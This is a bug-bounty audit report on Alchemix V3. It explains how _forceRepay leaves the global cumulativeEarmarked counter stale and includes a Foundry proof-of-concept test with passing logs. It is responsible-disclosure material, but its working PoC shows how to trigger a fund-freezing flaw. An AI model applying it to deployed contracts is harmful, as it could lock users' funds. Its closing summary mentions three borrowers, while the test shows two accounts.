# 56545 sc high force repayment leaves stale global earmarks freezing transmuter redemptions

**Submitted on Oct 17th 2025 at 13:35:15 UTC by @vivekd for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56545
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Permanent freezing of funds

## Description

## Brief/Intro

\_forceRepay clears a borrower's earmarked debt locally but never subtracts the same amount from the global cumulativeEarmarked. After a handful of liquidations that hit \_forceRepay, the protocol believes almost all debt is already earmarked; \_earmark then stops allocating new debt to the Transmuter, so future redemptions can't be serviced and user funds become permanently stuck.

## Vulnerability Details

* During liquidation the contract calls \_forceRepay (src/AlchemistV3.sol:819-823).
* \_forceRepay reduces the account's earmarked balance (src/AlchemistV3.sol:760-763), but unlike repay() or redeem() it never subtracts the removed amount from cumulativeEarmarked.
* Consequently, cumulativeEarmarked only grows. Once it equals totalDebt, every call to \_earmark() sees liveUnearmarked = totalDebt - cumulativeEarmarked == 0 (src/AlchemistV3.sol:1114), so no new debt is earmarked for the Transmuter queue.
* When the next user tries to create or claim a redemption, the Transmuter finds no earmarked debt available and the system stalls even though borrowers are still solvent.
* The issue does not require global insolvency; a single liquidation that enters \_forceRepay is enough to corrupt the global counter.

## Impact Details

* Earmarking debt is the only way the protocol reserves collateral for Transmuter claims. Once cumulativeEarmarked stays stuck at its old value, new earmarks cease and redemption requests back up forever.
* All alAsset holders waiting in the Transmuter queue are unable to exit, amounting to a permanent freeze of user funds.
* Because the global counter is never corrected, the freeze persists across liquidations and redemptions until the contract is upgraded.

## Proof of Concept

## Proof of Concept

```solidity
function testPoC_forceRepay_leaves_global_earmarks() external {
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        address attacker = address(0xbeef);
        vm.startPrank(attacker);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
        alchemist.deposit(depositAmount, attacker, 0);
        uint256 attackerTokenId = AlchemistNFTHelper.getFirstTokenId(attacker, address(alchemistNFT));
        uint256 attackerMint = alchemist.totalValue(attackerTokenId) * FIXED_POINT_SCALAR / minimumCollateralization;
        alchemist.mint(attackerTokenId, attackerMint, attacker);
        vm.stopPrank();

        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), attackerMint / 2);
        transmuterLogic.createRedemption(attackerMint / 2);
        vm.stopPrank();

        vm.roll(block.number + 500_000);
        alchemist.poke(attackerTokenId);
        (uint256 attackerCollateralBefore, uint256 attackerDebtBefore, uint256 attackerEarmarkBefore) = alchemist.getCDP(attackerTokenId);
        uint256 globalBefore = alchemist.cumulativeEarmarked();
        uint256 totalDebtBefore = alchemist.totalDebt();
        console.log("attackerCollateralBefore", attackerCollateralBefore);
        console.log("attackerDebtBefore", attackerDebtBefore);
        console.log("attackerEarmarkBefore", attackerEarmarkBefore);
        console.log("globalBefore", globalBefore);
        console.log("totalDebtBefore", totalDebtBefore);

        assertGt(attackerEarmarkBefore, 0, "attacker earmark > 0");
        assertApproxEqAbs(globalBefore, attackerEarmarkBefore, minimumDepositOrWithdrawalLoss, "global matches attacker before");

        address bystander = address(0xcafe);
        _magicDepositToVault(address(vault), bystander, depositAmount);
        vm.startPrank(bystander);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
        alchemist.deposit(depositAmount, bystander, 0);
        uint256 bystanderTokenId = AlchemistNFTHelper.getFirstTokenId(bystander, address(alchemistNFT));
        uint256 bystanderMint = alchemist.totalValue(bystanderTokenId) * FIXED_POINT_SCALAR / minimumCollateralization;
        alchemist.mint(bystanderTokenId, bystanderMint, bystander);
        vm.stopPrank();

        (, uint256 bystanderDebtBefore, uint256 bystanderEarmarkBefore) = alchemist.getCDP(bystanderTokenId);
        assertEq(bystanderEarmarkBefore, 0, "bystander has no earmark before liquidation");

        vm.startPrank(alOwner);
        uint256 highCollateralRequirement = 1_300_000_000_000_000_000;
        alchemist.setMinimumCollateralization(highCollateralRequirement);
        alchemist.setGlobalMinimumCollateralization(highCollateralRequirement);
        alchemist.setCollateralizationLowerBound(highCollateralRequirement);
        vm.stopPrank();

        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply * 1_000_000);
        IMockYieldToken(mockStrategyYieldToken).siphon(TokenUtils.safeBalanceOf(mockVaultCollateral, mockStrategyYieldToken) - 1);
        alchemist.poke(attackerTokenId);
        alchemist.poke(bystanderTokenId);

        uint256 attackerValueAfterDrop = alchemist.totalValue(attackerTokenId);
        uint256 attackerRatioAfterDrop = attackerDebtBefore == 0 ? 0 : attackerValueAfterDrop * FIXED_POINT_SCALAR / attackerDebtBefore;
        console.log("attackerRatioAfterDrop", attackerRatioAfterDrop);
        console.log("highCollateralRequirement", highCollateralRequirement);
        assertLt(attackerRatioAfterDrop, highCollateralRequirement, "attacker now undercollateralized");

        vm.startPrank(externalUser);
        alchemist.liquidate(attackerTokenId);
        vm.stopPrank();

        (uint256 attackerCollateralAfter, uint256 attackerDebtAfter, uint256 attackerEarmarkAfter) = alchemist.getCDP(attackerTokenId);
        (, uint256 bystanderDebtAfter, uint256 bystanderEarmarkAfter) = alchemist.getCDP(bystanderTokenId);
        uint256 globalAfter = alchemist.cumulativeEarmarked();
        uint256 totalDebtAfter = alchemist.totalDebt();
        console.log("attackerCollateralAfter", attackerCollateralAfter);
        console.log("attackerDebtAfter", attackerDebtAfter);
        console.log("attackerEarmarkAfter", attackerEarmarkAfter);
        console.log("bystanderDebtAfter", bystanderDebtAfter);
        console.log("bystanderEarmarkAfter", bystanderEarmarkAfter);
        console.log("globalAfter", globalAfter);
        console.log("totalDebtAfter", totalDebtAfter);

        assertLt(attackerCollateralAfter, attackerCollateralBefore, "attacker collateral reduced");
        assertEq(attackerEarmarkAfter, 0, "attacker earmark cleared");
        assertEq(bystanderEarmarkAfter, 0, "bystander still unearmarked");
        assertGt(totalDebtAfter, 0, "debt remains after force repay");
        assertApproxEqAbs(totalDebtAfter, attackerDebtAfter + bystanderDebtAfter, minimumDepositOrWithdrawalLoss, "total debt sums accounts after");
        assertEq(globalAfter, attackerEarmarkBefore, "global earmark was not reduced");
        assertGt(globalAfter, attackerEarmarkAfter + bystanderEarmarkAfter, "global earmark exceeds live per-account earmarks");
    }
```

Logs:

```
newuser@LAPTOP-MLPJMQD2:~/v3-poc$ FOUNDRY_PROFILE=default forge test --match-test testPoC_forceRepay_leaves_global_earmarks --jobs 1 --evm-version cancun
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. Visit https://book.getfoundry.sh/announcements for more information. 
To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] testPoC_forceRepay_leaves_global_earmarks() (gas: 4545164)
Logs:
  attackerCollateralBefore 200000000000000000000000
  attackerDebtBefore 180000000000000000018000
  attackerEarmarkBefore 8561643835616438357021
  globalBefore 8561643835616438357021
  totalDebtBefore 180000000000000000018000
  attackerRatioAfterDrop 1111111111111111111
  highCollateralRequirement 1300000000000000000
  attackerCollateralAfter 84066666666666666591009
  attackerDebtAfter 64666666666666666608469
  attackerEarmarkAfter 0
  bystanderDebtAfter 180000000000000000018000
  bystanderEarmarkAfter 0
  globalAfter 8561643835616438357021
  totalDebtAfter 244666666666666666626469

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 97.85ms (83.58ms CPU time)

Ran 1 test suite in 100.23ms (97.85ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The test performs the following:

* Creates three borrowers (A, B, C), earmarks A and B by opening Transmuter redemptions.
* Liquidates borrower A, which triggers \_forceRepay.
* Reads state afterwards: borrower-level earmarks are zero (attackerEarmarkAfter = 0, bystanderEarmarkAfter = 0) yet the global counter is still globalAfter = 8561643835616438357021.

Because the global counter is larger than the sum of account earmarks, future \_earmark calls see no "live" debt and Transmuter redemptions cannot proceed, proving the permanent-freeze condition.
